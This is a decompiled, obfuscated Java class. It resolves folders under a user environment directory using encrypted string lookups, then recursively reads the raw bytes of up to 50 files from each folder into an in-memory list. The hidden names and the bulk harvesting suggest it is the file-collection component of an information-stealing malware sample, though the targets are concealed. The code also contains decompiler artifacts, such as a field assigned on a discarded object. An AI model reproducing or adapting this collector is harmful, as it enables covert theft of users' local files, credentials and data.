/*
 * Decompiled with CFR 0.152.
 */
package x;

import java.io.File;
import java.nio.file.FileVisitOption;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

public final class aj {
    public static void a(String string, String stringArray, List<b> list2) {
        String[] stringArray2 = new String[]{System.getenv($S.d(211)) + $S.d(1051) + (String)stringArray, System.getenv($S.d(211)) + $S.d(1052) + (String)stringArray, System.getenv($S.d(211)) + $S.d(1053) + (String)stringArray};
        stringArray = stringArray2;
        stringArray = stringArray2;
        int cfr_ignored_0 = stringArray2.length;
        for (int i2 = 0; i2 < 3; ++i2) {
            String string2 = stringArray[i2];
            aj.b(string, string2, list2);
        }
    }

    public static void b(String string, String object, List<b> list2) {
        if (object == null) {
            return;
        }
        if (!((File)(object = new File((String)object))).exists()) {
            return;
        }
        b b2 = new b();
        new b().a = string;
        try {
            Files.walk(((File)object).toPath(), new FileVisitOption[0]).filter(path -> Files.isRegularFile(path, new LinkOption[0])).filter(path -> !path.getFileName().toString().startsWith(".")).limit(50L).forEach(arg_0 -> aj.a((File)object, b2, arg_0));
        }
        catch (Exception exception) {}
        if (!b2.b.isEmpty()) {
            list2.add(b2);
        }
    }

    private static /* synthetic */ void a(File file, b b2, Path path) {
        try {
            a a2 = new a();
            new a().a = file.getName() + "/" + file.toPath().relativize(path).toString().replace("\\", "/");
            a2.b = Files.readAllBytes(path);
            b2.b.add(a2);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    public static final class b {
        public String a;
        public List<a> b = new ArrayList<a>();
    }

    public static final class a {
        public String a;
        public byte[] b;
    }
}

